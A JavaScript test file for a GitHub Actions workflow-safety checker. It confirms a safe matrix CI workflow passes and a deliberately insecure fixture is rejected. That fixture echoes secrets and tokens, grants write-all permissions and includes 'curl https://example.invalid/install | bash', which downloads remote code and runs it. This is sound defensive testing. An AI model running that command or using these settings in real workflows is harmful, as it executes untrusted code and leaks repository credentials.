/** Verify workflow safety rules and the repository workflow. */
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import {
  inspectWorkflowDirectory,
  inspectWorkflowText,
} from "./workflow-safety.mjs";

const GOOD = `name: CI
on:
  push:
  pull_request:
permissions:
  contents: read
jobs:
  checks:
    strategy:
      fail-fast: false
      matrix:
        os: [macos-latest, ubuntu-latest, windows-latest]
    steps:
      - uses: actions/checkout@1111111111111111111111111111111111111111
        with:
          persist-credentials: false
      - uses: actions/upload-artifact@2222222222222222222222222222222222222222
`;

test("accepts a complete safe matrix workflow", () => {
  assert.deepEqual(inspectWorkflowText("ci.yml", GOOD), []);
});

test("rejects credential exposure and silently skipped platforms", () => {
  const bad = `name: bad
on:
  pull_request_target:
permissions: write-all
jobs:
  checks:
    permissions:
      id-token: write
    continue-on-error: true
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: true
      - run: echo "\${{ secrets.TOKEN }}"
      - run: echo "\${{ github.token }}"
      - run: set -x
      - run: curl https://example.invalid/install | bash
`;
  const violations = inspectWorkflowText("bad.yml", bad);
  assert.ok(violations.some((value) => value.includes("pull_request_target")));
  assert.ok(violations.some((value) => value.includes("repository secrets")));
  assert.ok(violations.some((value) => value.includes("repository token")));
  assert.ok(violations.some((value) => value.includes("write-all")));
  assert.ok(violations.some((value) => value.includes("write permission")));
  assert.ok(violations.some((value) => value.includes("not pinned")));
  assert.ok(violations.some((value) => value.includes("silently tolerates")));
  assert.ok(violations.some((value) => value.includes("persists checkout")));
  assert.ok(violations.some((value) => value.includes("shell tracing")));
  assert.ok(violations.some((value) => value.includes("downloaded content")));
  assert.ok(violations.some((value) => value.includes("windows-latest")));
});

test("rejects an empty workflow directory", () => {
  const root = mkdtempSync(join(tmpdir(), "muxyard-workflows-empty-"));
  try {
    const result = inspectWorkflowDirectory(root);
    assert.equal(result.files.length, 0);
    assert.match(result.violations[0], /no workflow files/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("accepts the repository workflow", () => {
  const directory = fileURLToPath(
    new URL("../../.github/workflows", import.meta.url),
  );
  const result = inspectWorkflowDirectory(directory);
  assert.deepEqual(result.violations, []);
  assert.ok(result.files.includes("ci.yml"));
});

test("rejects a workflow file with missing requirements", () => {
  const root = mkdtempSync(join(tmpdir(), "muxyard-workflows-bad-"));
  try {
    writeFileSync(join(root, "ci.yml"), "name: incomplete\n");
    const result = inspectWorkflowDirectory(root);
    assert.ok(result.violations.some((value) => value.includes("matrix")));
    assert.ok(
      result.violations.some((value) => value.includes("ubuntu-latest")),
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
